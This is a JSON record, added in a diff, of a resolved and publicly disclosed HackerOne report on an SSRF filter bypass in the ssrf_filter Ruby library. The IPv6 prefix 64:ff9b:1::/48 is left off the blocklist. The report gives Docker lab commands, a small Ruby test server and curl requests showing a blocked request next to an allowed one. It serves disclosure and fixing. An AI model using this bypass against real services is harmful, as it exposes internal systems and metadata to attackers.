@@ -1,0 +1,136 @@
+{
+  "id": 3634400,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM0NDAw",
+  "url": "https://hackerone.com/reports/3634400",
+  "title": "SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-28T15:26:54.569Z",
+  "submitted_at": "2026-03-28T15:26:55.040Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tipsen",
+    "url": "/tipsen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hjd58gb9dlkdxr27cjeu4k8ianat/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 29833,
+    "url": "https://hackerone.com/arkadiyt-projects",
+    "handle": "arkadiyt-projects",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "arkadiyt-projects",
+      "twitter_handle": "arkadiyt",
+      "website": "https://arkadiyt.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-03-31T02:31:50.435Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-31T02:31:16.127Z",
+  "team_member_agreed_on_going_public_at": "2026-03-31T02:31:50.054Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`ssrf_filter` v1.3.0 blocks `64:ff9b::/96`, but doesnt block the NAT64 local-use prefix `64:ff9b:1::/48`, allowing those addresses to be treated as public. This enables SSRF requests through `/fetch` to internal-equivalent targets encoded under that prefix when routable in the deployment environment.\n\n## Steps To Reproduce:\n1. Like previous report, start our lab first :) (I'm using the library in Docker)\n2. Start a second app container with `NET_ADMIN` so we can add a test IPv6 route/address.\n```bash\nTIPSEN:~:% NET=$(docker inspect ssrf_filter_lab --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')\nTIPSEN:~:% docker rm -f ssrf_filter_lab_netadmin 2>/dev/null || true\nssrf_filter_lab_netadmin\nTIPSEN:~:% docker run -d --name ssrf_filter_lab_netadmin --network \"$NET\" --cap-add NET_ADMIN -p 4568:4567 bbp-ssrf-ssrf-app ruby app.rb\n46929c09894e83249c8143c192a727f2583b116c2be0ce70e1528773fb3b388f\n```\n\n3. Install `iproute2` in that container and add NAT64 local-use address `64:ff9b:1::7f00:1` to loopback.\n```bash\nTIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'apt-get update -qq && apt-get install -y -qq iproute2 && ip -6 addr add 64:ff9b:1::7f00:1/128 dev lo || true && ip -6 addr show dev lo'\n...\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    inet6 64:ff9b:1::7f00:1/128 scope global\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host proto kernel_lo\n       valid_lft forever preferred_lft forever\n```\n\n4. Start a local HTTP service bound to that NAT64 local-use address.\n```bash\nTIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'cat > /tmp/vuln_server_nat64.rb << \"RUBY\"\nrequire \"socket\"\nserver = TCPServer.new(\"64:ff9b:1::7f00:1\", 18081)\nloop do\n  sock = server.accept\n  begin\n    while (line = sock.gets)\n      break if line == \"\\r\\n\"\n    end\n    body = \"NAT64_PREFIX_BYPASS_DEMO\"\n    sock.write(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: #{body.bytesize}\\r\\nConnection: close\\r\\n\\r\\n#{body}\")\n  ensure\n    sock.close rescue nil\n  end\nend\nRUBY\nnohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'\n```\n\n5. Verify the service is reachable on that address from inside the same container.\n```bash\nTIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'ruby -rsocket -e \"s=TCPSocket.new(\\\"64:ff9b:1::7f00:1\\\",18081); s.write(\\\"GET / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n\\\"); puts s.read; s.close\"'\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 24\nConnection: close\n\nNAT64_PREFIX_BYPASS_DEMO\n```\n\n6. Control check: known blocked NAT64 well-known prefix.\n```bash\nTIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'\n{\"status\":\"blocked\",\"error\":\"SsrfFilter::PrivateIPAddress\",\"message\":\"Hostname '64:ff9b::7f00:1' has no public ip addresses\"}%\n```\n\n7.  Bypass check: unblocked NAT64 local-use prefix.\n```bash\nTIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'\n{\"status\":\"allowed\",\"code\":\"200\",\"headers\":{\"content-type\":\"text/plain\",\"content-length\":\"24\",\"connection\":\"close\"},\"body\":\"NAT64_PREFIX_BYPASS_DEMO\"}%\n```\n\n## Supporting Material/References:\nGonna put the root cause here to make checking easier :)\n1. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L47-L59: `IPV6_BLACKLIST` includes `64:ff9b::/96` but doesn't include `64:ff9b:1::/48` (NAT64 local-use prefix), leaving that range unclassified as private/unsafe.\n2. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L139-L143: `unsafe_ip_address?` decides IPv6 safety only by membership in `IPV6_BLACKLIST`. Because `64:ff9b:1::/48` is missing, those addresses are treated as safe/public.\n3. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L126-L127: The resolver output is filtered with `unsafe_ip_address?` and unblocked NAT64 local-use addresses remain in `public_addresses`, so the private-IP guard is bypassed.\n\n## Impact\n\nAn attacker can bypass SSRF protections and force server-side requests to restricted/internal destinations using `64:ff9b:1::/48` addresses. This may expose sensitive internal services or metadata and can enable additional internal network reconnaissance or pivoting.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-04-30T02:31:16.417Z",
+  "allow_singular_disclosure_after": -822483.092040502,
+  "singular_disclosure_allowed": true,
+  "vote_count": 57,
+  "voters": [
+    "ath75",
+    "zywac",
+    "tipsen",
+    "papachicken",
+    "shelled",
+    "coder_mohammed",
+    "ahmed_xyz",
+    "mooox",
+    "sh3d0w",
+    "2026",
+    "and 47 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10493,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/arkadiyt/ssrf_filter",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
